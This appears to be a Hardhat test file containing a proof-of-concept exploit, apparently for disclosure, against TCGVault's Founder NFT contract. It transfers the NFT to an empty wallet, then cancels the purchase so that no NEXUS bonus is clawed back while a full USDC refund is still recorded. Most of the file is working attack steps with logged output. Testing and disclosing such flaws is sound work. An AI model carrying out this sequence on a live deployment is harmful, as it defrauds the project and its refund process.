/**
 * PoC: TCGVaultFounderNFT.cancelFounderPurchase() NEXUS clawback bypass via NFT transfer.
 *
 * Root cause: TCGNexusToken tracks no per-holder presale-bonus accounting. The clawback
 * amount is truncated to `balanceOf(msg.sender)` in the CALLER (TCGVaultFounderNFT), not
 * reverted. Because NEXUS is soulbound to the original recipient but the Founder NFT is a
 * plain transferable ERC721 authorised by ownerOf(), an attacker can decouple "who owes the
 * bonus" from "who is charged to repay it."
 *
 * This test proves, against the real compiled contracts (no mocks of the vulnerable code):
 *   1. Minter A receives 60 NEXUS (soulbound, confirmed non-transferable).
 *   2. A transfers the Founder NFT to a fresh wallet B (0 NEXUS) — plain ERC721 transfer,
 *      no override blocks it.
 *   3. B calls cancelFounderPurchase(tokenId) successfully (ownerOf-gated, passes).
 *   4. The clawback burns 0 NEXUS (not 60) because balanceOf(B) == 0.
 *   5. A still holds all 60 NEXUS afterward.
 *   6. The emitted FounderPurchaseCancelled event reports usdcRefundDue = 200 USDC (6dp)
 *      with nexusClawedBack = 0 — the exact reconciliation record the docs
 *      (docs/PRODUCT_LIFECYCLE.md, docs/WALLET_ADDRESSES.md) say the CASP uses to execute
 *      the off-chain USDC refund. The refund is authorised despite zero bonus recovery.
 */
import { describe, it, before } from "node:test";
import { expect } from "chai";
import hre from "hardhat";
import { getContractAddress, parseEther } from "viem";
import type { ContractReturnType } from "@nomicfoundation/hardhat-viem/types";

const { viem } = await hre.network.connect();

describe("PoC: NEXUS clawback bypass via Founder NFT transfer", () => {
  it("attacker keeps the full presale NEXUS bonus while cancellation still reports a full USDC refund due", async () => {
    const [owner, attackerA, attackerB] = await viem.getWalletClients();

    const WAVE1_PRICE = 200n * 1_000_000n; // 200 USDC, 6 decimals

    // --- Deploy MockWETH as USDC stand-in, fund attacker A ---
    const usdc = await viem.deployContract("MockWETH", [], { client: { wallet: owner } });
    await usdc.write.deposit({ value: parseEther("1000"), account: owner.account });
    await usdc.write.transfer([attackerA.account.address, parseEther("1000")], { account: owner.account });

    // --- Deploy real TCGNexusToken + TCGVaultFounderNFT in the project's fixed CREATE order ---
    const publicClient = await viem.getPublicClient();
    const n0 = BigInt(await publicClient.getTransactionCount({ address: owner.account.address, blockTag: "pending" }));
    const mockAddr = getContractAddress({ from: owner.account.address, nonce: n0 });
    const nexusAddr = getContractAddress({ from: owner.account.address, nonce: n0 + 1n });

    // A throwaway address is fine for the "minter" (TCGVaultToken) slot — this PoC never
    // exercises mintCashback, only the presale-bonus path, which is gated on FounderNFT.
    const mockTcgv = await viem.deployContract("contracts/test/MockTCGVPresale.sol:MockTCGVPresale", [], {
      client: { wallet: owner },
    });
    if (mockTcgv.address.toLowerCase() !== mockAddr.toLowerCase()) throw new Error("nonce mismatch");

    const founderAddr = getContractAddress({ from: owner.account.address, nonce: n0 + 2n });
    // InitialLaunch is never deployed in this PoC — pass a placeholder that satisfies the
    // non-zero-address constructor check; the exploit only requires the FounderNFT path.
    await viem.deployContract(
      "TCGNexusToken",
      [mockAddr, founderAddr, owner.account.address],
      { client: { wallet: owner } },
    );
    const nexus = await viem.getContractAt("TCGNexusToken", nexusAddr);

    const founderNFT = await viem.deployContract(
      "TCGVaultFounderNFT",
      [usdc.address, nexusAddr, owner.account.address],
      { client: { wallet: owner } },
    );
    if (founderNFT.address.toLowerCase() !== founderAddr.toLowerCase()) throw new Error("nonce mismatch");

    // --- Step 1: attacker A mints a paid Founder NFT (wave 1, 200 USDC) ---
    await usdc.write.approve([founderNFT.address, WAVE1_PRICE], { account: attackerA.account });
    await founderNFT.write.mint({ account: attackerA.account });

    const tokenId = 0n;
    const expectedNexus = (WAVE1_PRICE * 3000n * 10n ** 18n) / (10000n * 1_000_000n); // NEXUS_BONUS_BP=3000 (30%)
    expect(expectedNexus).to.equal(60n * 10n ** 18n);

    const balanceAAfterMint = await nexus.read.balanceOf([attackerA.account.address]);
    expect(balanceAAfterMint).to.equal(expectedNexus);
    console.log(`[1] Attacker A minted Founder NFT #${tokenId}, received ${balanceAAfterMint} NEXUS (60e18 expected)`);

    // Sanity: NEXUS really is soulbound (balances cannot be moved directly).
    let soulboundReverted = false;
    try {
      await nexus.write.transfer([attackerB.account.address, 1n], { account: attackerA.account });
    } catch {
      soulboundReverted = true;
    }
    expect(soulboundReverted).to.equal(true);
    console.log(`[2] Confirmed NEXUS is soulbound — direct transfer() reverts as expected`);

    // --- Step 2: attacker A transfers the FOUNDER NFT (not the NEXUS) to fresh wallet B ---
    await founderNFT.write.transferFrom(
      [attackerA.account.address, attackerB.account.address, tokenId],
      { account: attackerA.account },
    );
    expect((await founderNFT.read.ownerOf([tokenId])).toLowerCase()).to.equal(
      attackerB.account.address.toLowerCase(),
    );
    console.log(`[3] Attacker A transferred Founder NFT #${tokenId} to fresh wallet B (0 NEXUS) — unrestricted, plain ERC721`);

    const balanceBBeforeCancel = await nexus.read.balanceOf([attackerB.account.address]);
    expect(balanceBBeforeCancel).to.equal(0n);

    // --- Step 3: attacker B (current NFT owner, 0 NEXUS) cancels the purchase ---
    const cancelTxHash = await founderNFT.write.cancelFounderPurchase([tokenId], { account: attackerB.account });
    const receipt = await publicClient.waitForTransactionReceipt({ hash: cancelTxHash });
    console.log(`[4] Attacker B called cancelFounderPurchase(${tokenId}) successfully (ownerOf-gated check passed)`);

    // --- Step 4: decode the FounderPurchaseCancelled event to read the on-chain reconciliation record ---
    const logs = await publicClient.getContractEvents({
      address: founderNFT.address,
      abi: founderNFT.abi,
      eventName: "FounderPurchaseCancelled",
      fromBlock: receipt.blockNumber,
      toBlock: receipt.blockNumber,
    });
    expect(logs.length).to.equal(1);
    const { buyer, usdcRefundDue, nexusClawedBack } = logs[0].args as {
      buyer: `0x${string}`;
      tokenId: bigint;
      usdcRefundDue: bigint;
      nexusClawedBack: bigint;
    };
    console.log(
      `[5] FounderPurchaseCancelled event: buyer=${buyer}, usdcRefundDue=${usdcRefundDue} (${
        Number(usdcRefundDue) / 1e6
      } USDC), nexusClawedBack(actual burned)=${nexusClawedBack}`,
    );

    // The event's usdcRefundDue is exactly the 200 USDC purchase price — this is the field
    // docs/PRODUCT_LIFECYCLE.md and docs/WALLET_ADDRESSES.md say the CASP uses to execute the
    // off-chain USDC repayment. It fires at full value regardless of clawback success.
    expect(usdcRefundDue).to.equal(WAVE1_PRICE);

    // THE BUG: despite A having received 60 NEXUS for this exact purchase, actual burn is 0.
    expect(nexusClawedBack).to.equal(0n);

    // --- Step 5: attacker A still holds the full presale bonus ---
    const balanceAAfterCancel = await nexus.read.balanceOf([attackerA.account.address]);
    expect(balanceAAfterCancel).to.equal(expectedNexus);
    console.log(
      `[6] FINAL: Attacker A retains ${balanceAAfterCancel} NEXUS (full 60e18 bonus) while the ` +
        `cancellation record authorises a full ${Number(usdcRefundDue) / 1e6} USDC off-chain refund. ` +
        `Net attacker cost: gas only.`,
    );
  });
});
